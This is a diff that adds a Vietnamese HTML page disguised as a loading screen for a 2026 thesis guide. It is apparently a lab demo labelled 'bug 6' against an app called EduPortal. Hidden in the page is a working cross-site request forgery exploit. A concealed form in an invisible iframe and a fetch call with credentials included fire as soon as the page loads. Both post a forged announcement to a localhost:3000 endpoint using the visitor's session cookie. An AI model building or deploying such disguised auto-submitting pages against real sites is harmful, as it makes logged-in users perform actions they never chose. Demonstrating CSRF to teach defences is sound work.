@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Tài Liệu Hướng Dẫn Khóa Luận 2026</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f1f5f9;
+      color: #334155;
+    }
+    .loading-card {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 450px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2563eb;
+      border-radius: 50%;
+      width: 44px;
+      height: 44px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h2 { margin: 0 0 10px; font-size: 20px; }
+    p { margin: 0; color: #64748b; font-size: 14px; }
+  </style>
+</head>
+<body>
+
+  <div class="loading-card">
+    <div class="spinner"></div>
+    <h2>Đang tải tài liệu...</h2>
+    <p>Hệ thống đang chuẩn bị tệp khóa luận hướng dẫn mới nhất cho bạn.</p>
+  </div>
+
+  <!-- Form ngầm gửi qua iframe ẩn (Cơ chế CSRF cổ điển) -->
+  <iframe name="csrf-hidden-frame" style="display:none;"></iframe>
+  <form id="csrfForm" action="http://localhost:3000/api/cap-nhat-thong-bao" method="POST" target="csrf-hidden-frame" style="display:none;">
+    <input type="hidden" name="tieu_de" value="YÊU CẦU DUYỆT BỔ SUNG MINH CHỨNG ĐỀ TÀI #87 (CSRF Triggered)">
+    <input type="hidden" name="noi_dung" value="Thao tác tự động được kích hoạt thông qua phiên đăng nhập của sinh viên mà không có CSRF Token xác thực.">
+  </form>
+
+  <script>
+    // LỖI 6: Mã khai thác CSRF tự động gửi ngầm request sang EduPortal
+    window.addEventListener('DOMContentLoaded', () => {
+      const host = window.location.hostname || 'localhost';
+      const targetUrl = `http://${host}:3000/api/cap-nhat-thong-bao`;
+
+      // 1. Kích hoạt form ngầm (đảm bảo 100% cookie được đính kèm sang cổng 3000)
+      const form = document.getElementById('csrfForm');
+      if (form) {
+        form.action = targetUrl;
+        form.submit();
+      }
+
+      // 2. Đồng thời gửi qua fetch để hiển thị rõ trong tab Network (F12)
+      setTimeout(() => {
+        fetch(targetUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          credentials: 'include', // Kèm theo Cookie phiên làm việc của nạn nhân
+          body: JSON.stringify({
+            tieu_de: "YÊU CẦU DUYỆT BỔ SUNG MINH CHỨNG ĐỀ TÀI #87 (CSRF Triggered)",
+            noi_dung: "Thao tác tự động được kích hoạt thông qua phiên đăng nhập của sinh viên mà không có CSRF Token xác thực."
+          })
+        }).then(res => res.json())
+          .then(data => {
+            console.log("[CSRF Success] Request âm thầm thực thi thành công:", data);
+          })
+          .catch(err => {
+            console.error("[CSRF Fetch Log]:", err);
+          });
+      }, 300);
+    });
+  </script>
+</body>
+</html>
+
